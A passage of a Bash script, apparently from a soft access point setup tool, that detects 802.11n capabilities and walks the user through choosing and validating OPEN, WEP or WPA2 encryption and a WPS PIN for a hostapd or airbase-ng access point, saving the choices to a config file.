		$cecho "Tx STBC (Space–Time Block Codes)    : "$RED"Disabled"$END""
	fi

	if [ -n "`iw $PHY info | grep "HT TX Max spatial streams:"  | awk '{print $6}'`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "Tx Max spatial streams              : "$GREEN""`iw $PHY info | grep "HT TX Max spatial streams:" | awk '{print $6}'`""$END""
	elif [ ! -n "`iw $PHY info | grep "HT TX Max spatial streams:"  | awk '{print $6}'`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "Tx Max spatial streams              : "$RED"Not supported"$END""
	fi

	if [ -n "`iw $PHY info | grep -o "RX STBC 1-stream"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "Rx STBC (Space–Time Block Codes)    : "$GREEN"One spatial stream"$END""
		export ht_capab=$ht_capab"[RX-STBC1]"
	elif [ -n "`iw $PHY info | grep -o "RX STBC 2-streams"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "Rx STBC (Space–Time Block Codes)    : "$GREEN"One or two spatial streams"$END""
		export ht_capab=$ht_capab"[RX-STBC12]"
	elif [ -n "`iw $PHY info | grep -o "RX STBC 3-streams"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "Rx STBC (Space–Time Block Codes)    : "$GREEN"One, two, or three spatial streams"$END""
		export ht_capab=$ht_capab"[RX-STBC123]"
	elif [ -n "`iw $PHY info | grep -o "No RX STBC"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "Rx STBC (Space–Time Block Codes)    : "$RED"None spatial streams"$END""
	fi
	if [ -n "`iw $PHY info | grep -o "Max AMSDU length: 7935 bytes"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "Maximum A-MSDU length               : "$GREEN"7935 octets"$END""
		export ht_capab=$ht_capab"[MAX-AMSDU-7935]"
	elif [ -n "`iw $PHY info | grep -o "Max AMSDU length: 3839 bytes"`" ] && [ "$ieee80211n" = "1" ];then
		#Not set means 3839 octets
		$cecho "Maximum A-MSDU length               : "$GREEN"3839 octets (default)"$END""
	fi
	if [ -n "`iw $PHY info | grep -o "No DSSS/CCK HT40"`" ] && [ "$ieee80211n" = "1" ];then
		#Not set means not allowed
		$cecho "DSSS/CCK Mode in 40 MHz             : "$RED"Not allowed"$END""
	elif [ -n "`iw $PHY info | grep -o "DSSS/CCK HT40"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "DSSS/CCK Mode in 40 MHz             : "$GREEN"Allowed"$END""
		export ht_capab=$ht_capab"[DSSS_CCK-40]"
	fi
	if [ -n "`iw $PHY info | grep "rate indexes supported:"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "HT TX/RX MCS rate indexes supported : "$GREEN""`iw $PHY info | grep "rate indexes supported:" | sed 's%.*: %%g' | sed 's%,.*%%g'`""$END""
	elif [ ! -n "`iw $PHY info | grep "rate indexes supported:"`" ] && [ "$ieee80211n" = "1" ];then
		$cecho "HT TX/RX MCS rate indexes supported : "$RED"Not Supported by driver"$END""
	fi
	}


	if [ "$hostapd_mode" = "a" ] && [ "$ieee80211n" = "1" ];then
		export n_mode="a/n"
	elif [ "$hostapd_mode" = "g" ] && [ "$ieee80211n" = "1" ];then
		export n_mode="g/n"
	fi

	IEEE_802_11n_HEAD(){ 
	clear
	AVAILBL_CONFIG_ANTENNAS
	$cecho ""$BLUE"H o s t a p d"$END"" | centered_text
	echo
	$cecho ""$BLUE"I E E E  8 0 2 . 1 1 N  M o d e"$END"" | centered_text
	echo
	echo
	$cecho "IEEE802.11n HT (High Throughput) capabilities of: "$GREEN"$WIFACE - "`ls /sys/class/net/"$WIFACE"/device/driver/module/drivers`""$END""
	$cecho
	$cecho "Selected channel                    : "$GREEN"$CHAN"$END""
	$cecho "Available Antenna(s)*               : $AVAILBL_ANTENNAS"
	$cecho "Configured Antenna(s)*              : $CONFIG_ANTENNAS"
	$cecho "IEEE802.11 Mode                     : "$GREEN""$n_mode""$END""
	IEEE_802_11n_CAPABILITIES
	echo
	echo "*802.11n throughput depends heavily on Channel Width, additional antennas, spatial streams and GI time."
	$cecho ""$GREEN"Channels Width:"$END"       "$GREEN"20MHz"$END"               "$GREEN"40MHz"$END""
	$cecho ""$GREEN"GI (ms):"$END"         "$GREEN"0.4ms    0.8ms      0.4ms     0.8ms"$END""
	$cecho ""$GREEN"1 Antenna"$END"      72Mbit/s  65Mbit/s  150Mbit/s 135Mbit/s "$RED"*"$END""
	$cecho ""$GREEN"2 Antennas"$END"    144Mbit/s 130Mbit/s  300Mbit/s 270Mbit/s "$RED"*"$END""
	$cecho ""$GREEN"3 Antennas"$END"    217Mbit/s 195Mbit/s  450Mbit/s 405Mbit/s "$RED"*"$END""
	$cecho ""$GREEN"4 Antennas"$END"    289Mbit/s 260Mbit/s  600Mbit/s 540Mbit/s "$RED"*"$END""
	$cecho ""$RED"*max. theoretical throughput"
	$cecho ""$BLUE"http://en.wikipedia.org/wiki/IEEE_802.11n-2009"$END""
	echo
	echo "Would you like to: "
	echo "1. Enable 802.11n 20 MHz Channel Width."
	if [ -n "`iw $PHY info | grep -o "HT20/HT40"`" ];then
		echo "2. Enable 802.11n 40 MHz Channel Width."
		echo "3. Continue using Mode: 802.11"$hostapd_mode" only"
		export a2="2"
		export a3="3"
	else
		echo "2. Continue using Mode: 802.11"$hostapd_mode" only"
		export a2="2"
		export a3="2"
	fi
	}

	if [ "$ieee80211n" = "0" -o "$ieee80211n" = "1" ] && [ "$hostapd_mode" = "a" -o "$hostapd_mode" = "g" ] && [ "$ATHDRV" = "no" -o "$ATHDRV" = "monitor" ];then
		export ht_capab="NONE"
		export ieee80211n="0"
		sed 's%IEEE_802_11n.*%IEEE_802_11n disabled%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
		sed 's%HT_CAPAB.*%HT_CAPAB '$ht_capab'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
	elif [ "$ieee80211n" = "1" ] && [ "$hostapd_mode" = "a" -o "$hostapd_mode" = "g" ] && [ "$ATHDRV" = "hostapd" -o "$ATHDRV" = "hostapd_madwifi" ];then
		while :
			do
				IEEE_802_11n_HEAD
				if [ -n "`iw $PHY info | grep -o "HT20/HT40"`" ];then
					$necho "Please enter your choice ( 1 - 3 ): "
					read opt
				else
					$necho "Please enter your choice ( 1 - 2 ): "
					read opt
				fi
					case $opt in
						1)
							export ht_capab="`echo $ht_capab | sed 's/\(\[\HT40+\]\)//g' | sed 's/\(\[\HT40-\]\)//g'`"
							export ieee80211n="1"
							sed 's%IEEE_802_11n.*%IEEE_802_11n enabled%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
							sed 's%HT_CAPAB.*%HT_CAPAB '$ht_capab'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
							break
						;;
						$a3)
							export ht_capab="NONE"
							export ieee80211n="0"
							sed 's%IEEE_802_11n.*%IEEE_802_11n disabled%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
							sed 's%HT_CAPAB.*%HT_CAPAB '$ht_capab'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
							break
						;;
						$a2)
							export ieee80211n="1"
							sed 's%IEEE_802_11n.*%IEEE_802_11n enabled%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
							sed 's%HT_CAPAB.*%HT_CAPAB '$ht_capab'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
							break
						;;
						"")
							IEEE_802_11n_HEAD
							$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
							read -p 'Press ENTER to continue...' string
						;;			
						*)
							IEEE_802_11n_HEAD
							$cecho "! ! ! "$RED""$opt""$END" is an invalid option ! ! !"
							$cecho "Please select option between 1-2 only"
							read -p 'Press ENTER to continue...' string
						;;
					esac
			done
	fi

	# Delete channels.txt. Not needed any more
	if [ -f $MEM_DIR/channels.txt ];then
		rm $MEM_DIR/channels.txt
	fi

	#################################################################################################################
	# 						Encryption							#
	# 	If we are using hostapd then let's choose what type of encryption we will use OPEN, WEP, WPA2-PSK	#
	# 			Otherwise (master mode or airbase-ng) we can use OPEN or WEP				#
	#################################################################################################################
	if [ "$ATHDRV" = "hostapd" ] || [ "$ATHDRV" = "hostapd_madwifi" ];then
		while :
		do
			clear
			$cecho ""$BLUE"H O S T A P D  -  E N C R Y P T I O N  -  M E N U"$END"" | centered_text
			echo
			echo
			echo "You have three option for the encryption of the SoftAP "
			echo 
			echo "1. OPEN (no encryption)"
			echo "2. WEP encryption 40bits or 104bits"
			echo "3. WPA2 Pre-shared key*"
			echo
			echo "*Wi-Fi protected setup (WPS) can be used only with WPA2 encryption."
			echo
			$necho "Please enter option [1 - 3]: "
			read opt
			case $opt in
			1) 
				export ENCR_TYPE="OPEN"
				export AP_KEY="NONE"
				export WPS_PIN="NONE"
				sed 's%ENCRYPTION.*%ENCRYPTION '$ENCR_TYPE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
				sed 's%KEY.*%KEY '$AP_KEY'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
				sed 's%WPS_PIN.*%WPS_PIN '$WPS_PIN'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
				break
			;;
			2)
				export ENCR_TYPE="WEP"
				export WPS_PIN="NONE"
				sed 's%WPS_PIN.*%WPS_PIN '$WPS_PIN'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
				break
			;;
			3)
				export ENCR_TYPE="WPA2"
				break
			;;
			"")
				$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
				read -p 'Press ENTER to continue...' string
			;;			
			*)
				$cecho "! ! ! "$RED""$opt""$END" is an invalid option ! ! !"
				$cecho "Please select option between 1-3 only"
				read -p 'Press ENTER to continue...' string
			;;
		esac
		done
	else
		while :
		do
			clear
			$cecho ""$BLUE"A I R B A S E - N G  -  E N C R Y P T I O N  -  M E N U"$END"" | centered_text
			echo
			echo		
			echo "You have two option for the encryption of the SoftAP "
			echo 
			echo "1. OPEN (no encryption)"
			echo "2. WEP encryption 40bits or 104bits"
			echo
			$necho "Please enter option [1 - 2]: "
			read opt
		case $opt in
			1)
				export ENCR_TYPE="OPEN"
				export AP_KEY="NONE"
				export WPS_PIN="NONE"
				sed 's%ENCRYPTION.*%ENCRYPTION '$ENCR_TYPE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
				sed 's%KEY.*%KEY '$AP_KEY'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
				sed 's%WPS_PIN.*%WPS_PIN '$WPS_PIN'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf	
				break
			;;
			2)
				export ENCR_TYPE="WEP"
				export WPS_PIN="NONE"
				sed 's%WPS_PIN.*%WPS_PIN '$WPS_PIN'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf	
				break
			;;
			"") 
				$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
				echo "Please select option between 1-2 only."
				read -p 'Press ENTER to continue...' string
			;;
			*)
				$cecho "! ! ! "$RED""$opt""$END" is an invalid option ! ! !"
				$cecho "Please select option between 1-2 only."
				read -p 'Press ENTER to continue...' string
			;;
		esac
		done
	fi

	#################################################################################################################
	# 						Is it WPA2-PSK?							#
	#		 NONE means OPEN. No encryption. (When Enter is pressed by fault)				#
	#################################################################################################################
	WPA2_PSK_HEAD(){ 
		clear
		$cecho ""$BLUE"W P A 2 - P S K  ( P r e - s h a r e d  k e y )  -  M E N U"$END"" | centered_text
		echo
		$cecho "Valid keys are: any "$GREEN"ASCII"$END" passphrase "$GREEN"8"$END" to "$GREEN"63"$END" characters long" 
		$cecho "(e.g. "$GREEN"abcdefgh"$END" or "$GREEN"abcdefghijklmnopqrstuwwxyz1234567890!@#$%^&*()_"$END""
		echo
	}
	WPA2_PSK_MENU(){ 
		if [ "`grep "ENCRYPTION" $HOME_DIR/aerial.conf | awk '{print $2}'`" = "WPA2" ] && [ -n "`grep "KEY" $HOME_DIR/aerial.conf | awk '{print $2}'`" ] && [ "`grep "KEY" $HOME_DIR/aerial.conf | awk '{print $2}'`" != "NONE" ] ;then
			export AP_KEY1="`grep "KEY" $HOME_DIR/aerial.conf | awk '{print $2}'`"
			$cecho "Enter your SoftAP's WPA2 password."
			$cecho "Type "$GREEN"NONE"$END" for no password (Encryption OPEN)"
			$necho "Or press ENTER for current WPA2 password ("$GREEN""$AP_KEY1""$END"): "
		else
			$cecho "Enter your SoftAP's WPA2 password."
			$necho "Type "$GREEN"NONE"$END" for no password (Encryption OPEN) :"
		fi
	}
	if [ "$ENCR_TYPE" = "WPA2" ];then
		WPA2_PSK_HEAD
		WPA2_PSK_MENU
		while read AP_KEY
			do
				HEXSTRIPPED="`echo $AP_KEY | sed 's/[^[:print:]]//g'`"
				SHORTLEN="`expr length "$AP_KEY"`"
				if [ "$AP_KEY" = "NONE" ];then
					export ENCR_TYPE="OPEN"
					export AP_KEY="NONE"
					export WPS_PIN="NONE"
					sed 's%ENCRYPTION.*%ENCRYPTION '$ENCR_TYPE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
					sed 's%KEY.*%KEY '$AP_KEY'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
					sed 's%WPS_PIN.*%WPS_PIN '$WPS_PIN'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
					break
				elif [ -z "${AP_KEY}" ] && [ -n "$AP_KEY1" ];then
					export AP_KEY="$AP_KEY1"
					sed 's%KEY.*%KEY '$AP_KEY'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
					sed 's%ENCRYPTION.*%ENCRYPTION '$ENCR_TYPE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
					break
				else
					if [ "$SHORTLEN" -ge 8 ] && [ "$SHORTLEN" -le 63 ];then
						if [ "$HEXSTRIPPED" = "$AP_KEY" ];then
							sed 's%KEY.*%KEY '$AP_KEY'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
							sed 's%ENCRYPTION.*%ENCRYPTION '$ENCR_TYPE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
							break
						else 
							WPA2_PSK_HEAD
								if [ -z "${AP_KEY}" ];then
									$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
								else
									$cecho "! ! ! "$RED"$AP_KEY"$END" it's not a valid ASCII key ! ! !"
								fi
							echo
							WPA2_PSK_MENU
						fi
					else
						WPA2_PSK_HEAD
							if [ -z "${AP_KEY}" ];then
								$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
							else
								$cecho "! ! ! "$RED"$AP_KEY"$END" it's not a valid ASCII key ! ! !"
							fi
						echo			
						WPA2_PSK_MENU
					fi
				fi
			done
	fi

	#################################################################################################################
	#					Wi-Fi Protected Setup - WPS						#
	#														#
	# Encryption must be WPA2											#
	# WPS pin: Can be any number,exact 8 digits long								#
	# No input means use the current										#
	# NONE means disable Wi-Fi protected setup (WPS)								#
	# WPS virtual push button:											#
	# hostapd_cli -p /var/run/hostapd wps_pbc or hostapd_cli wps_pbc						#
	#														#
	# http://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf							#
	# http://w1.fi/gitweb/gitweb.cgi?p=hostap-07.git;a=commitdiff_plain;h=3b2cf800afaaf4eec53a237541ec08bebc4c1a0c	#
	#################################################################################################################
	WPS_HEAD(){
 	clear
	$cecho ""$BLUE"S o f t  A P's  W P S - M E N U"$END"" | centered_text
	echo
	$cecho ""$BLUE"Wi-Fi Protected Setup"$END"" | centered_text
	echo
	echo
	echo "WPS pin should be any number exact 8 digits long."
	$cecho "(e.g. "$GREEN"12345670"$END")."
	echo
	echo "WPS requires either a device PIN code (usually, 8-digit number) or a"
	echo "pushbutton event (for PBC) to allow a new WPS Enrollee to join the network."
	echo "Hostapd needs to be notified about the AP button pushed event over the control interface,"
	echo "by typing manually in a console:"
	$cecho ""$GREEN"hostapd_cli wps_pbc"$END""
	echo
	}

	WPS_MENU(){ 
		if [ "`grep "ENCRYPTION" $HOME_DIR/aerial.conf | awk '{print $2}'`" = "WPA2" ] && [ -n "`grep "KEY" $HOME_DIR/aerial.conf | awk '{print $2}'`" ] && [ "`grep "KEY" $HOME_DIR/aerial.conf | awk '{print $2}'`" != "NONE" ] && [ -n "`grep "WPS_PIN" $HOME_DIR/aerial.conf | awk '{print $2}'`" ] && [ "`grep "WPS_PIN" $HOME_DIR/aerial.conf | awk '{print $2}'`" != "NONE" ];then
			export WPS_PIN1="`grep "WPS_PIN" $HOME_DIR/aerial.conf | awk '{print $2}'`"
			$cecho "Enter your SoftAP's WPS pin [Optional]"
			$cecho "Type "$GREEN"NONE"$END" to disable WPS"
			$necho "Or press ENTER for current WPS pin ("$GREEN""$WPS_PIN1""$END") :"
		elif [ "`grep "ENCRYPTION" $HOME_DIR/aerial.conf | awk '{print $2}'`" = "WPA2" ] && [ -n "`grep "KEY" $HOME_DIR/aerial.conf | awk '{print $2}'`" ] && [ "`grep "KEY" $HOME_DIR/aerial.conf | awk '{print $2}'`" != "NONE" ] && [ -n "`grep "WPS_PIN" $HOME_DIR/aerial.conf | awk '{print $2}'`" ] && [ "`grep "WPS_PIN" $HOME_DIR/aerial.conf | awk '{print $2}'`" = "NONE" ];then
			export WPS_PIN1="`grep "WPS_PIN" $HOME_DIR/aerial.conf | awk '{print $2}'`"
			$cecho "Enter your SoftAP's WPS pin [Optional]"
			$necho "Press ENTER to disable WPS: "
		else
			$cecho "Enter your SoftAP's WPS pin [Optional]"
			$necho "Type "$GREEN"NONE"$END" to disable WPS: "
		fi
	}
	if [ "$ENCR_TYPE" = "WPA2" ];then
		WPS_HEAD
		WPS_MENU
		while read WPS_PIN
			do
				NUMSTRIPPED="`echo $WPS_PIN | sed 's/[^0-9]//g'`"
				SHORTLEN="`expr length "$WPS_PIN"`"
					if [ "$WPS_PIN" = "NONE" ];then
						export WPS_PIN="NONE"
						sed 's%WPS_PIN.*%WPS_PIN '$WPS_PIN'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf	
						break
					elif [ -z "${WPS_PIN}" ] && [ -n "$WPS_PIN1" ] && [ "$WPS_PIN1" = "NONE" ];then
						export WPS_PIN="$WPS_PIN1"
						sed 's%WPS_PIN.*%WPS_PIN '$WPS_PIN'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
						break
					elif [ -z "${WPS_PIN}" ] && [ -n "$WPS_PIN1" ];then
						export WPS_PIN="$WPS_PIN1"
						sed 's%WPS_PIN.*%WPS_PIN '$WPS_PIN'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf	
						break
					else
						if [ $SHORTLEN -eq 8 ];then
							if [ "$NUMSTRIPPED" = "$WPS_PIN" ];then
								sed 's%WPS_PIN.*%WPS_PIN '$WPS_PIN'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf	
								break
							else 
								WPS_HEAD
									if [ -z "${WPS_PIN}" ];then
										$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
									else
										$cecho "! ! ! "$RED"$WPS_PIN"$END" it's not a valid  WPS pin ! ! !"
										echo "Must be a number exact 8 digits long."
									fi
								echo
								WPS_MENU
							fi
						else
							WPS_HEAD
								if [ -z "${WPS_PIN}" ];then
									$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
								else
									$cecho "! ! ! "$RED"$WPS_PIN"$END" it's not a valid  WPS pin ! ! !"
									echo "Must be a number exact 8 digits long."
								fi
							echo
							WPS_MENU
						fi
					fi
			done
	fi

	#################################################################################################################
	# WEP encryption (Validating user inputs for ASCII key (5 or 13 characters) or HEX key (10 or 26 characters).	#
	# 		Auto detect from the key length and type, the type of the key (ASCII or HEX) 			#
	#				and the type of the encryption (40 or 104 bit)					#
	# 					NONE means OPEN. No encryption.						#
	#################################################################################################################
	WEP_HEAD(){ 
		clear
		$cecho ""$BLUE"W E P  e n c r y p t i o n  4 0 b i t s  o r  1 0 4 b i t s  -  M E N U"$END"" | centered_text
		echo
		echo
		$cecho "Valid keys are : "$GREEN"5"$END" or "$GREEN"13"$END" characters ASCII" 
		$cecho "                "$GREEN"10"$END" or "$GREEN"26"$END" characters HEX"
		echo
		$cecho "     "$BLUE"ASCII"$END"                "$BLUE"HEX"$END""
		$cecho "(e.g. "$GREEN"aaaaa"$END"         or "$GREEN"ab:cd:ef:01:23"$END""
		$cecho "(e.g. "$GREEN"aaaaaaaaaaaaa"$END" or "$GREEN"ab:ab:ab:ab:ab:ab:cd:ef:01:23:45:56:67"$END")"
		echo
		echo
	}

	WEP_MENU(){ 
		if [ "`grep "ENCRYPTION" $HOME_DIR/aerial.conf | awk '{print $2}'`" = "ASCII_40" -o "`grep "ENCRYPTION" $HOME_DIR/aerial.conf | awk '{print $2}'`" = "HEX_40"  -o "`grep "ENCRYPTION" $HOME_DIR/aerial.conf | awk '{print $2}'`" = "ASCII_104" -o "`grep "ENCRYPTION" $HOME_DIR/aerial.conf | awk '{print $2}'`" = "HEX_104" ] && [ -n "`grep "KEY" $HOME_DIR/aerial.conf | awk '{print $2}'`" ] && [ "`grep "KEY" $HOME_DIR/aerial.conf | awk '{print $2}'`" != "NONE" ] ;then
			export AP_KEY1="`grep "KEY" $HOME_DIR/aerial.conf | awk '{print $2}'`"
			$cecho "Type "$GREEN"NONE"$END" for no password (Encryption OPEN)"
			$cecho "Or press ENTER for current WEP password ("$GREEN""$AP_KEY1""$END")"
			$necho "Please enter your SoftAP's WEP password: "
		else
			$cecho "Type "$GREEN"NONE"$END" for no password (Encryption OPEN)"
			$necho "Please enter your SoftAP's WEP password: "
		fi
	}

	if [ "$ENCR_TYPE" = "WEP" ];then
		WEP_HEAD
		WEP_MENU
		while read AP_KEY
			do
				ASCIISTRIPPED="`echo $AP_KEY | sed 's/[^[:graph:]]//g'`"
				HEXSTRIPPED="`echo $AP_KEY | sed 's/[^0-9A-Fa-f:]//g'`"
				SHORTLEN="`expr length "$AP_KEY"`"
					if [ "$AP_KEY" = "NONE" ];then
						sed 's%ENCRYPTION.*%ENCRYPTION OPEN%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
						sed 's%KEY.*%KEY NONE%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
						sed 's%WPS_PIN.*%WPS_PIN NONE%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
						break
					elif [ -z "${AP_KEY}" ] && [ -n "$AP_KEY1" ];then
						export AP_KEY="$AP_KEY1"
						export ENCR_TYPE="`grep "ENCRYPTION" $HOME_DIR/aerial.conf | awk '{print $2}'`"
						sed 's%KEY.*%KEY '$AP_KEY'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
						sed 's%ENCRYPTION.*%ENCRYPTION '$ENCR_TYPE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
						sed 's%WPS_PIN.*%WPS_PIN NONE%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf	
						break
					else
						if [ "$SHORTLEN" -eq 5 ] || [ "$SHORTLEN" -eq 13 ];then
							if [ "$ASCIISTRIPPED" = "$AP_KEY" ];then
								if [ "$SHORTLEN" -eq 5 ];then
									ENCR_TYPE="ASCII_40"
									sed 's%ENCRYPTION.*%ENCRYPTION '$ENCR_TYPE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
									sed 's%KEY.*%KEY '$AP_KEY'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
									sed 's%WPS_PIN.*%WPS_PIN NONE%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
									break
								elif [ "$SHORTLEN" -eq 13 ];then
									ENCR_TYPE="ASCII_104"
									sed 's%ENCRYPTION.*%ENCRYPTION '$ENCR_TYPE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
									sed 's%KEY.*%KEY '$AP_KEY'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
									sed 's%WPS_PIN.*%WPS_PIN NONE%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
									break
								fi
							else
								WEP_HEAD
									if [ -z "${AP_KEY}" ];then
										$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
									else
										$cecho "! ! ! "$RED"$AP_KEY"$END" it's not a valid ASCII key ! ! !"
									fi

								echo
								WEP_MENU
							fi
						else
							if [ $SHORTLEN -eq 14 ] || [ $SHORTLEN -eq 38 ];then
								if [ "$HEXSTRIPPED" = "$AP_KEY" ];then
									if [ $SHORTLEN -eq 14 ];then
										ENCR_TYPE="HEX_40"
										sed 's%ENCRYPTION.*%ENCRYPTION '$ENCR_TYPE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
										sed 's%KEY.*%KEY '$AP_KEY'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
										sed 's%WPS_PIN.*%WPS_PIN NONE%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
										break
									elif [ $SHORTLEN -eq 38 ];then
										ENCR_TYPE="HEX_104"
										sed 's%ENCRYPTION.*%ENCRYPTION '$ENCR_TYPE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
										sed 's%KEY.*%KEY '$AP_KEY'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
										sed 's%WPS_PIN.*%WPS_PIN NONE%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
										break
									fi
								else
									WEP_HEAD
										if [ -z "${AP_KEY}" ];then
											$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
										else
											$cecho "! ! ! "$RED"$AP_KEY"$END" it's not a valid HEX key ! ! !"
										fi
									echo
									WEP_MENU					
								fi
							else
								WEP_HEAD
									if [ -z "${AP_KEY}" ];then
										$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
									else
										$cecho "! ! ! "$RED"$AP_KEY"$END" it's not a valid ASCII or HEX key ! ! !"
									fi
								echo
								WEP_MENU
							fi
						fi
				fi
			done
	fi
fi

#################################################################################################################
#					Free RAM & Disk Space Calculation					#
#														#
# 					Minimum requirements for Squid3						#
# 					>256 MB Free disk space							#
# 					>128 MB Free RAM							#
#														#
# 					1) System's File System							#
# 					2) HDD - Free disk space						#
# 					3) RAM - Free space:							#
#														#
#		1) File system											#
#		2) We need at least 128 MB of free disk space to run mode 2.					#
# 		3) Free RAM:											#	
# 		Calculate how much free memory we have available to use in Squid3				#
